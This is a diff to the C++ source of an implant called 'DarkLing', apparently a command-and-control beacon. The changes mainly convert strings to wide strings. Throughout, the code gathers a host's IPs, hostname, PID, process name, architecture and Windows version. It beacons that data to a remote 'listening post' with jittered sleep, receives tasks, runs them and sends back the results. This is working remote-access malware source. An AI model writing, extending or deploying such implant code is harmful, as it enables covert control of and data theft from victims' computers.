@@ -32,7 +32,7 @@ void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
 [[nodiscard]] std::string sendHttpRequest(std::string_view host,
     std::string_view port,
     std::string_view uri,
-    std::string_view payload) {
+    std::wstring_view payload) {
     // Set all our request constants
     auto const serverAddress = host;
     auto const serverPort = port;
@@ -60,7 +60,7 @@ void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
             return ss.str();
         }
         // Show the request contents
-        std::cout << "Request body: " << requestBody << std::endl;
+        //std::cout << "Request body: " << requestBody << std::endl;
 
         // Return the body of the response from the listening post, may include new tasks
         return response.text;
@@ -70,38 +70,37 @@ void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
     }
 };
 
-std::string GetRegistry() // Needs Optimization because at the moment this function works but the code is very shit
+std::wstring GetRegistry() // Needs Optimization because at the moment this function works but the code is very shit
 {
     unsigned long size = 1024;
     HKEY registryHandle;
-    const char* subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
+    const wchar_t* subkey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
     const wchar_t* subkey2 = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
 
 
     DWORD szValue;
-    RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &registryHandle);
-    RegQueryValueExA(registryHandle, "CurrentMajorVersionNumber", NULL, NULL, (LPBYTE)&szValue, &size);
-    std::string MajorVersion = std::to_string(szValue);
+    RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &registryHandle);
+    RegQueryValueExW(registryHandle, L"CurrentMajorVersionNumber", NULL, NULL, (LPBYTE)&szValue, &size);
+    std::wstring MajorVersion = std::to_wstring(szValue);
 
-    RegQueryValueExA(registryHandle, "CurrentMinorVersionNumber", NULL, NULL, (LPBYTE)&szValue, &size);
+    RegQueryValueExW(registryHandle, L"CurrentMinorVersionNumber", NULL, NULL, (LPBYTE)&szValue, &size);
     RegCloseKey(registryHandle);
-    std::string MinorVersion = std::to_string(szValue);
+    std::wstring MinorVersion = std::to_wstring(szValue);
 
     WCHAR szValue2[1024];
     DWORD bufferSize = sizeof(szValue2);
     RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey2, 0, KEY_READ, &registryHandle);
     RegQueryValueExW(registryHandle, L"CurrentBuildNumber", NULL, NULL, (LPBYTE)&szValue2, &bufferSize);
     RegCloseKey(registryHandle);
-    std::wstring ws(szValue2);
-    std::string BuildNumber(ws.begin(),ws.end());
+    std::wstring BuildNumber(szValue2);
 
 
-    std::stringstream ret;
+    std::wstringstream ret;
     ret << MajorVersion << "." << MinorVersion << "." << BuildNumber;
     return ret.str();
 }
 
-std::string GetPublicIP() {
+std::wstring GetPublicIP() {
     try {
         // Construct our listening post endpoint URL from user args, only HTTP to start
         std::stringstream ss;
@@ -116,7 +115,9 @@ std::string GetPublicIP() {
         //std::cout << response.text << std::endl; // For debug
 
         // Return the body of the response from the listening post, may include new tasks
-        return response.text;
+        std::string r = response.text;
+        std::wstring ws(r.begin(),r.end());
+        return ws;
     }
     catch (std::exception& e) {
         std::cerr << "Could not deal with socket. Exception: " << e.what() << std::endl;
@@ -141,7 +142,7 @@ std::string GetMachineIP() {
     }
 }
 
-std::string GetProcessorArchirecture() {
+std::wstring GetProcessorArchirecture() {
     // SYSTEM_INFO structure
     SYSTEM_INFO siSysInfo;
 
@@ -150,18 +151,18 @@ std::string GetProcessorArchirecture() {
     // Store Processor Arch in our local variable
     switch (siSysInfo.wProcessorArchitecture) {
     case 0:
-        return "x86";
+        return L"x86";
     case 6:
-        return "Intel Itanium Processor Family";
+        return L"Intel Itanium Processor Family";
     case 9:
-        return "x64";
+        return L"x64";
     case 0xffff:
     default:
-        return "Unknown Architecture";
+        return L"Unknown Architecture";
     }
 }
 
-std::string GetProcessName() {
+std::wstring GetProcessName() {
     TCHAR path[1024];
     LPWSTR FileName;
     DWORD length;
@@ -169,47 +170,51 @@ std::string GetProcessName() {
     length = GetModuleFileName(NULL, path, 1000); // Gets the full path of our process
     FileName = PathFindFileName(path); // We pass the path and we get the FileName to our process :) aka lazy trick
 
-    std::wstring t(FileName);
-    std::string t2(t.begin(), t.end());
+    std::wstring t1(FileName);
 
 
-    return t2;
+    return t1;
 
 }
 
-std::string GetPID() {
+std::wstring GetPID() {
     DWORD pid = GetCurrentProcessId();
-    return std::to_string(pid);
+    return std::to_wstring(pid);
 }
 
 void Implant::beaconCheckIn(const char* url) {
     // Return Processor Arch
-    std::string arch = GetProcessorArchirecture();
+    std::wstring arch = GetProcessorArchirecture();
     // Store OS info in our local variable
-    std::string osinfo = GetRegistry();
+    std::wstring osinfo = GetRegistry();
     // Local results variable and root for our ptree
-    boost::property_tree::ptree resultsLocal;
+    boost::property_tree::wptree resultsLocal;
     // Our results string that we will send to the server
-    std::stringstream resultsStringStream;
+    std::wstringstream resultsStringStream;
     // Function from boost lib that gets the hostname and returns a string type
     std::string hostname = boost::asio::ip::host_name();
+    std::wstring Lhostname(hostname.begin(), hostname.end());
     // Functions from boost lib that gets the Machine IP address and Public IP
-    std::string PublicIP = GetPublicIP();
+    std::wstring PublicIP = GetPublicIP();
+    
     std::string machineIP = GetMachineIP();
+    std::wstring LmachineIP(machineIP.begin(), machineIP.end());
+
     // Function that gets Beacon Process PID
-    std::string PID = GetPID();
+    std::wstring PID = GetPID();
     // Function that gets current Proces Name;
-    std::string nameProcess = GetProcessName();
+    std::wstring nameProcess = GetProcessName();
 
     // Adding our results to the root ptree for json format
-    resultsLocal.put("beacon_id", ids);
-    resultsLocal.put("Public IP", PublicIP);
-    resultsLocal.put("IP", machineIP);
-    resultsLocal.put("Hostname", hostname);
-    resultsLocal.put("PID", PID);
-    resultsLocal.put("Process Name", nameProcess);
-    resultsLocal.put("Architecture", arch);
-    resultsLocal.put("Windows Version", osinfo);
+    std::wstring Lids(ids.begin(), ids.end());
+    resultsLocal.put(L"beacon_id", Lids);
+    resultsLocal.put(L"Public IP", PublicIP);
+    resultsLocal.put(L"IP", LmachineIP);
+    resultsLocal.put(L"Hostname", Lhostname);
+    resultsLocal.put(L"PID", PID);
+    resultsLocal.put(L"Process Name", nameProcess);
+    resultsLocal.put(L"Architecture", arch);
+    resultsLocal.put(L"Windows Version", osinfo);
     // Parsing to json format
     boost::property_tree::write_json(resultsStringStream,resultsLocal);
     if (sendHttpRequest(host, port, url, resultsStringStream.str()) == "0") { setRunning(false); }
@@ -224,14 +229,14 @@ void Implant::setMeanDwell(double meanDwell) {
 // Method to send task results and receive new tasks
 [[nodiscard]] std::string Implant::sendResults() {
     // Local results variable
-    boost::property_tree::ptree resultsLocal;
+    boost::property_tree::wptree resultsLocal;
     // A scoped lock to perform a swap
     {
         std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
         resultsLocal.swap(results);
     }
     // Format result contents
-    std::stringstream resultsStringStream;
+    std::wstringstream resultsStringStream;
     boost::property_tree::write_json(resultsStringStream, resultsLocal);
     // Contact listening post with results and return any tasks received
     return sendHttpRequest(host, port, uri, resultsStringStream.str());
@@ -276,9 +281,10 @@ void Implant::serviceTasks() {
             const auto [id2, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
             // Scoped lock to add task results
             {
+                std::wstring wsTmp(id2.begin(), id2.end()); // UNICODE PROBLEMSSSSS
                 std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
-                results.add(id2 + ".contents", contents);
-                results.add(id2 + ".success", success);
+                results.add(wsTmp + L".contents", contents); // UNICODE PROBLEMSSSSS
+                results.add(wsTmp + L".success", success); // UNICODE PROBLEMSSSSS
             }
         }
         // Go to sleep
@@ -291,13 +297,14 @@ void Implant::Pinger() {
     while (isRunning) { //While loop for ping every 10 seconds
         if (ids != "") {
             // Local results variable and root for our ptree
-            boost::property_tree::ptree resultsLocal;
+            boost::property_tree::wptree resultsLocal;
             // Our results string that we will send to the server
-            std::stringstream resultsStringStream;
+            std::wstringstream resultsStringStream;
 
             // Adding our results to the root ptree for json format
-            resultsLocal.put("beacon_id", ids); //requires fix
-            resultsLocal.put("alive", "TRUE");
+            std::wstring Lids(ids.begin(), ids.end());
+            resultsLocal.put(L"beacon_id", Lids); //requires fix
+            resultsLocal.put(L"alive", "TRUE");
             // Parsing to json format
             boost::property_tree::write_json(resultsStringStream, resultsLocal);
 
@@ -318,16 +325,16 @@ void Implant::beacon() {
         // Then, if tasks were received, parse and store them for execution
         // Tasks stored will be serviced by the task thread asynchronously
         try {
-            std::cout << "DarkLing is sending results to listening post...\n" << std::endl;
+            std::wcout << L"DarkLing is sending results to listening post...\n" << std::endl;
             const auto serverResponse = sendResults();
             if (serverResponse == "0") { setRunning(false); }; // checks if server is running if not than exit
-            std::cout << "\nListening post response content: " << serverResponse << std::endl;
-            std::cout << "\nParsing tasks received..." << std::endl;
+            //std::wcout << "\nListening post response content: " << serverResponse << std::endl;
+            std::wcout << L"\nParsing tasks received..." << std::endl;
             parseTasks(serverResponse);
-            std::cout << "\n================================================\n" << std::endl;
+            std::wcout << L"\n================================================\n" << std::endl;
         }
         catch (const std::exception& e) {
-            printf("\nBeaconing error: %s\n", e.what());
+            wprintf(L"\nBeaconing error: %s\n", e.what());
         }
         // Sleep for a set duration with jitter and beacon again later
         const auto sleepTimeDouble = dwellDistributionSeconds(device);
